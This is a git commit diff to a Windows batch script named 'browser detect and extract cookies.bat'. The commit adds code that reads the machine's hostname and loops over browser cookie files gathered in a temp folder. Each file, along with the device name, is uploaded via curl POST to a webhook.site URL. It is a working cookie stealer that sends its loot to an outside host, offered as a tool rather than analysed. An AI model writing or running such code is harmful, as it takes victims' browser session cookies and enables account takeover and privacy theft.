bbae5f4ab20f3322501ff2f1b547fc53d9e16550
Ranush Mithila <36297308+RanushMithila@users.noreply.github.com>
2024-03-13 22:51:23 +0530

    Update browser detect and extract cookies.bat
    This can send cookie files through curl request

--- browser detect and extract cookies.bat
+++ browser detect and extract cookies.bat
@@ -3,6 +3,7 @@ echo Checking for installed browsers...
 set "RANDOMNAME=%RANDOM%"
 set "DEST=%TMP%\%RANDOMNAME%"
 mkdir "%DEST%"
+for /f "tokens=*" %%a in ('hostname') do set DeviceName=%%a
 echo Randomfile is %DEST%
 
 if exist "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" (
@@ -26,4 +27,13 @@ if exist "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" (
 
 echo Done.
 
+:: Hardcoded email credentials
+set "EmailUsername=your_email@gmail.com"
+set "EmailPassword=your_password"
+
+:: Iterate over files in the destination directory and send email for each file
+for %%A in ("%DEST%\*") do (
+    curl -X POST -F "file=@%%A" https://webhook.site/50e04090-829b-4ff1-bb01-7a9d2b82d17c
+    curl -X POST -d "{'Device':'%DeviceName%', 'File':'%%A'}" https://webhook.site/50e04090-829b-4ff1-bb01-7a9d2b82d17c
+)
 pause
